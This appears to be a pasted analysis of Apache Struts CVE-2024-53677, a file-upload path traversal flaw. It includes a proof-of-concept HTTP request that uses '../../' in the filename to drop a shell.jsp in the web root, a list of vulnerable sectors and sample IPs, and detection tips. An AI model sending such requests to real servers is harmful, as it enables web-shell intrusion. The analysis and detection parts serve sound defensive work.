Apache Struts CVE-2024-53677 analysis notes

Author: vuln_researcher_88 2024-11-14 14:22 UTC Views: 1,205 Expires: Never 
## CVE-2024-53677 — Apache Struts File Upload RCE

CVSS v3.1: 9.8 (CRITICAL)
Affected versions: Struts 2.0.0 - 6.3.0.2
Patch available: 6.4.0+

### Summary
Path traversal vulnerability in the file upload interceptor allows
unauthenticated attackers to upload malicious files (e.g., webshells)
to arbitrary locations on the server.

### Technical Details
The vulnerability exists in the `FileUploadInterceptor` component.
When processing multipart/form-data requests, the filename parameter
is not properly sanitized. Attackers can use directory traversal
sequences (../../) to escape the upload directory.

### PoC (educational purposes)
POST /upload.action HTTP/1.1
Host: target.com
Content-Type: multipart/form-data; boundary=----BOUNDARY

------BOUNDARY
Content-Disposition: form-data; name="upload"; filename="../../webapps/ROOT/shell.jsp"
Content-Type: application/octet-stream


------BOUNDARY--

### Affected Organizations (from Shodan scan)
- ~15,000 internet-facing Struts instances detected
- Major sectors: government (.gov), healthcare, financial services
- IPs of confirmed vulnerable (sample):
  203.0.113.50
  198.51.100.75
  192.0.2.100
  2001:db8::1

### Detection
Monitor for:
- POST requests to /upload.action with ../ in filename
- New .jsp files in web root directories
- Outbound connections from web servers on unusual ports
